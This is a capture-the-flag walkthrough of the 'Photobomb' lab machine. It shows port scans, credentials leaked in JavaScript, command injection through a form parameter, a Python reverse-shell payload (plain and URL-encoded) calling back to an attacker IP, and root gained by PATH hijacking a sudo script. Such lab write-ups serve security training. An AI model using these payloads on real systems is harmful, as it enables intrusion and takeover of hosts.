# Photobomb 

## Victim IP

`export target="10.10.11.182"`

## Attacker IP

`export attacker="10.10.16.6"`


## Open Ports

```
sudo nmap -Pn -p- -sS -T4 ${target}
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-20 21:57 EST
Nmap scan report for 10.10.11.182
Host is up (0.037s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

```

## Enumerate Open Ports

```
nmap -Pn -p22,80 -sC -sV ${target} -oA ${target}
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-20 21:57 EST
Nmap scan report for 10.10.11.182
Host is up (0.0085s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.18 seconds

```

## Add site name to /etc/hosts

```
grep ${target} /etc/hosts
10.10.11.182 photobomb.htb

```

## Set up Proxy and visit site

Step up Burp Suite to proxy the traffic for http://photobomb.htb and then visit the site.  Looking at the HTTPHistory in Burp Suite, we see that the site makes a call to a js file, photobomb.js.  This file contains credentials to the /printer endpoint.

### photobomb.js snippet  

```
// Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://<REDACTED>:<REDACTED>@photobomb.htb/printer');
  }
}
```

The /printer endpoint contains an http form that performs a POST request with 3 parameters: `photo, filetype, and dimensions`.  I started tcpdump to listen for ICMP request and sent the following payload to each parameter: `;ping+-c+2+10.10.16.6`.  

### On attack box

`sudo tcpdump -i tun0 host ${target} and icmp `

### In Burp suite
- payload in photo parameter: `photo=almas-salakhov-VK7TCqcZTlw-unsplash.jpg;ping+-c+2+10.10.16.6&filetype=jpg&dimensions=150x100`
- payload in filetype parameter: `photo=almas-salakhov-VK7TCqcZTlw-unsplash.jpg&filetype=jpg;ping+-c+2+10.10.16.6&dimensions=150x100`
- payload in dimensions parameter: `photo=almas-salakhov-VK7TCqcZTlw-unsplash.jpg&filetype=jpg&dimensions=150x100;ping+-c+2+10.10.16.6`

We find that the filetype parameter is vulnerable to command injection:  

```
sudo tcpdump -i tun0 host ${target} and icmp       
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
23:42:59.555833 IP photobomb.htb > 10.10.16.6: ICMP echo request, id 4, seq 1, length 64
23:42:59.555871 IP 10.10.16.6 > photobomb.htb: ICMP echo reply, id 4, seq 1, length 64
23:43:00.557856 IP photobomb.htb > 10.10.16.6: ICMP echo request, id 4, seq 2, length 64
23:43:00.557894 IP 10.10.16.6 > photobomb.htb: ICMP echo reply, id 4, seq 2, length 64
```

So let's modify our payload to initiate a reverse shell.  The new payload is this(credits to [swisskyrepo]("https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp") for the Revere shell cheatsheets:  

```
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.6",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```
Replacing our previous ping command, the complete payload is this(the payload is url encoded):

```
photo=almas-salakhov-VK7TCqcZTlw-unsplash.jpg&filetype=jpg;%70%79%74%68%6f%6e%33%20%2d%63%20%27%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%2c%6f%73%2c%70%74%79%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%30%2e%31%30%2e%31%36%2e%36%22%2c%34%32%34%32%29%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%30%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%31%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%32%29%3b%70%74%79%2e%73%70%61%77%6e%28%22%2f%62%69%6e%2f%73%68%22%29%27&dimensions=150x100
```

Setup a netcat listener on port 4242, submit the payload and catch the connection:
```
nc -lnvp 4242                                                                                                                                                                                    148 ⨯ 1 ⚙
listening on [any] 4242 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.182] 55714
$ whoami
whoami
wizard

```

## user flag

```
wizard@photobomb:~$ cat user.txt
cat user.txt
<REDACTED>
wizard@photobomb:~$ 
```
## sudo privileges

```
wizard@photobomb:/tmp$ sudo -l
sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh

```

## We can run this script as root

```
wizard@photobomb:~/photobomb/source_images$ ls -ltr
ls -ltr
total 39220
-r--r--r-- 1 root root 1877621 Sep 14 09:29 voicu-apostol-MWER49YaD-M-unsplash.jpg
-r--r--r-- 1 root root  390372 Sep 14 09:29 masaaki-komori-NYFaNoiPf7A-unsplash.jpg
-r--r--r-- 1 root root 4343934 Sep 14 09:29 andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg
-r--r--r-- 1 root root 1845735 Sep 14 09:29 tabitha-turner-8hg0xRg5QIs-unsplash.jpg
-r--r--r-- 1 root root 1631101 Sep 14 09:29 nathaniel-worrell-zK_az6W3xIo-unsplash.jpg
-r--r--r-- 1 root root 3031697 Sep 14 09:29 kevin-charit-XZoaTJTnB9U-unsplash.jpg
-r--r--r-- 1 root root 4566230 Sep 14 09:29 calvin-craig-T3M72YMf2oc-unsplash.jpg
-r--r--r-- 1 root root 6012726 Sep 14 09:29 eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg
-r--r--r-- 1 root root 1205127 Sep 14 09:29 finn-whelen-DTfhsDIWNSg-unsplash.jpg
-r--r--r-- 1 root root 5203844 Sep 14 09:29 almas-salakhov-VK7TCqcZTlw-unsplash.jpg
-r--r--r-- 1 root root 6020717 Sep 14 09:29 mark-mc-neill-4xWHIpY2QcY-unsplash.jpg
-r--r--r-- 1 root root 2808800 Sep 14 09:29 wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg
-rwxr-xr-x 1 root root 1183448 Nov 21 05:04 bash.jpg
wizard@photobomb:~/photobomb/source_images$ cd ..
cd ..
wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh
cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;

```

```
wizard@photobomb:~/photobomb$ cd /tmp
wizard@photobomb:/tmp$ echo "/usr/bin/bash -p" > find
wizard@photobomb:/tmp$ chmod +x find
wizard@photobomb:/tmp$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
root@photobomb:/home/wizard/photobomb# whoami
whoami
root@photobomb:/home/wizard/photobomb# cd /root
cd /root
root@photobomb:~# ls
ls
root.txt
root@photobomb:~# cat root.txt
cat root.txt
<REDACTED>
root@photobomb:~#
```
